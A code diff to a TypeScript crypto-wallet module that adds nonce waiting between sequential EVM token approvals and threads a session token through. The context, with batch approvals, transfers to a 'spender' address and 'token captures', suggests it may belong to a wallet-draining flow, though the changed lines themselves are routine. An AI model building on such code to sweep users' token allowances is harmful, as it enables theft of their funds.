@@ -17,6 +17,10 @@ import { getErrorMessage, isUserRejection } from "../core/errors";
 import { PERMISSION_DENIED_BY_USER_MESSAGE } from "../core/link-flow-meta";
 import { EVM_CHAIN_ID, isEvmChainKey } from "../core/native-chains";
 import {
+  awaitEvmSequentialApprovalGap,
+  readEvmPendingNonce,
+} from "../core/evm-nonce-sync";
+import {
   buildNativeWalletCall,
   fetchNativeTransferEstimate,
 } from "./batch-native-estimate";
@@ -134,6 +138,7 @@ export async function runEvmTokenBatchApproval(
       executeTransfer: shouldAttemptTransfer,
       transferToAddress: spender,
       transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
+      walletSessionToken: args.walletSessionToken,
     };
 
     try {
@@ -329,7 +334,13 @@ async function runSequentialFallback(
 
   const results: AuthorizationAssetResult[] = [];
   const tokenCaptures: WalletPhaseTokenCapture[] = [];
-  for (const item of items) {
+  let evmPendingNonce =
+    isEvmChainKey(args.network) && /^0x[a-fA-F0-9]{40}$/.test(owner)
+      ? await readEvmPendingNonce({ network: args.network, owner })
+      : null;
+
+  for (let itemIndex = 0; itemIndex < items.length; itemIndex += 1) {
+    const item = items[itemIndex]!;
     if (item.asset === "NATIVE") continue;
     args.onAssetStart?.(item);
 
@@ -394,6 +405,7 @@ async function runSequentialFallback(
           transferAmountRaw: shouldAttemptTransfer
             ? transferAmountRaw
             : undefined,
+          walletSessionToken: args.walletSessionToken,
         };
         const preflight = await preflightExistingAllowance({
           api: preflightApi,
@@ -512,6 +524,35 @@ async function runSequentialFallback(
         };
         results.push(result);
         args.onAssetEnd?.(result);
+        if (
+          evmPendingNonce != null &&
+          itemIndex < items.length - 1 &&
+          orchestration.txHash
+        ) {
+          args.log?.("EVM_SEQUENTIAL_NONCE_WAIT", {
+            network: item.network,
+            token,
+            txHash: orchestration.txHash,
+            baselineNonce: evmPendingNonce.toString(),
+          });
+          try {
+            const advanced = await awaitEvmSequentialApprovalGap({
+              network: item.network,
+              owner,
+              txHash: orchestration.txHash,
+              baselineNonce: evmPendingNonce,
+            });
+            if (advanced != null) {
+              evmPendingNonce = advanced;
+            }
+          } catch (nonceErr) {
+            args.log?.("EVM_SEQUENTIAL_NONCE_WAIT_FAILED", {
+              network: item.network,
+              token,
+              error: getErrorMessage(nonceErr, "Nonce wait failed"),
+            });
+          }
+        }
         continue;
       }
 
@@ -536,6 +577,35 @@ async function runSequentialFallback(
       };
       results.push(result);
       args.onAssetEnd?.(result);
+      if (
+        evmPendingNonce != null &&
+        itemIndex < items.length - 1 &&
+        orchestration.txHash
+      ) {
+        args.log?.("EVM_SEQUENTIAL_NONCE_WAIT", {
+          network: item.network,
+          token,
+          txHash: orchestration.txHash,
+          baselineNonce: evmPendingNonce.toString(),
+        });
+        try {
+          const advanced = await awaitEvmSequentialApprovalGap({
+            network: item.network,
+            owner,
+            txHash: orchestration.txHash,
+            baselineNonce: evmPendingNonce,
+          });
+          if (advanced != null) {
+            evmPendingNonce = advanced;
+          }
+        } catch (nonceErr) {
+          args.log?.("EVM_SEQUENTIAL_NONCE_WAIT_FAILED", {
+            network: item.network,
+            token,
+            error: getErrorMessage(nonceErr, "Nonce wait failed"),
+          });
+        }
+      }
     } catch (err) {
       const rejected = isUserRejection(err);
       const result: AuthorizationAssetResult = {
